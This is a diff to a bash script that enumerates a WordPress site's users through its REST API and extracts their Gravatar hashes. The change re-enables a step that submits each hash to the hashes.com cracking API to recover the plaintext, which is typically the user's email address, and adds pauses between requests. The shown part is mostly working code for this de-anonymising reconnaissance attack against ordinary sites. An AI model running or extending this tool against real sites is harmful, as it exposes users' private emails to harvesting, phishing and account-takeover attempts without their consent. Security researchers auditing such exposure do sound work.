@@ -19,12 +19,11 @@ if [ -z "$DOMAIN" ]; then
   exit 1
 fi
 
-# Hash lookup temporarily disabled
-# if [ -z "$HASHES_API_KEY" ]; then
-#   echo -e "${RED}[-] Error:${NC} HASHES_API_KEY environment variable is not set" >&2
-#   echo -e "${RED}[-]${NC} Please set your hashes.com API key: ${CYAN}export HASHES_API_KEY='your_api_key'${NC}" >&2
-#   exit 1
-# fi
+if [ -z "$HASHES_API_KEY" ]; then
+  echo -e "${RED}[-] Error:${NC} HASHES_API_KEY environment variable is not set" >&2
+  echo -e "${RED}[-]${NC} Please set your hashes.com API key: ${CYAN}export HASHES_API_KEY='your_api_key'${NC}" >&2
+  exit 1
+fi
 
 test_url() {
   local url="$1"
@@ -40,26 +39,25 @@ test_url() {
   return 1
 }
 
-# Hash lookup temporarily disabled
-# lookup_hash() {
-#   local hash="$1"
-#   response=$(curl -s -X POST \
-#     -H "Content-type: multipart/form-data" \
-#     -F "key=$HASHES_API_KEY" \
-#     -F "hashes[]=$hash" \
-#     "https://hashes.com/en/api/search")
-#
-#   if echo "$response" | jq -e '.founds | length > 0' >/dev/null 2>&1; then
-#     plaintext=$(echo "$response" | jq -r '.founds[0].plaintext // empty')
-#     if [ -n "$plaintext" ]; then
-#       echo "$plaintext"
-#     else
-#       echo "not_found"
-#     fi
-#   else
-#     echo "not_found"
-#   fi
-# }
+lookup_hash() {
+  local hash="$1"
+  response=$(curl -s -X POST \
+    -H "Content-type: multipart/form-data" \
+    -F "key=$HASHES_API_KEY" \
+    -F "hashes[]=$hash" \
+    "https://hashes.com/en/api/search")
+
+  if echo "$response" | jq -e '.founds | length > 0' >/dev/null 2>&1; then
+    plaintext=$(echo "$response" | jq -r '.founds[0].plaintext // empty')
+    if [ -n "$plaintext" ]; then
+      echo "$plaintext"
+    else
+      echo "not_found"
+    fi
+  else
+    echo "not_found"
+  fi
+}
 
 CLEAN_DOMAIN=$(echo "$DOMAIN" | sed 's|^https\?://||')
 
@@ -82,7 +80,7 @@ echo -e "${GREEN}[+]${NC} WordPress API accessible at ${CYAN}$BASE_URL${NC}" >&2
 
 USER_COUNT=$(jq '. | length' /tmp/wp_response.json)
 echo -e "${GREEN}[+]${NC} Found ${BOLD}$USER_COUNT${NC} user(s)" >&2
-echo -e "${GREEN}[+]${NC} Extracting Gravatar hashes..." >&2
+echo -e "${GREEN}[+]${NC} Extracting Gravatar hashes and looking up plaintexts..." >&2
 
 CURRENT=0
 {
@@ -99,15 +97,14 @@ CURRENT=0
 
       if [ -n "$hash" ]; then
         echo -e "${GREEN}[+]${NC}   Hash found: ${CYAN}${hash:0:16}...${NC}" >&2
-        # Hash lookup temporarily disabled
-        # echo -e "${GREEN}[+]${NC}   Querying hashes.com API..." >&2
-        # plaintext=$(lookup_hash "$hash")
-        # if [ "$plaintext" != "not_found" ]; then
-        #   echo -e "${GREEN}[+]${BOLD}   Plaintext recovered!${NC}" >&2
-        # else
-        #   echo -e "${YELLOW}[-]${NC}   Plaintext not found in database" >&2
-        # fi
-        plaintext="disabled"
+        echo -e "${GREEN}[+]${NC}   Querying hashes.com API..." >&2
+        plaintext=$(lookup_hash "$hash")
+        if [ "$plaintext" != "not_found" ]; then
+          echo -e "${GREEN}[+]${BOLD}   Plaintext recovered!${NC}" >&2
+        else
+          echo -e "${YELLOW}[-]${NC}   Plaintext not found in database" >&2
+        fi
+        sleep 1  # Pause between API requests
         jq -n --arg user "$username" --arg slug "$slug" --arg hash "$hash" --arg plaintext "$plaintext" \
           '{user: $user, username: $slug, hash: $hash, plaintext: $plaintext}'
       else
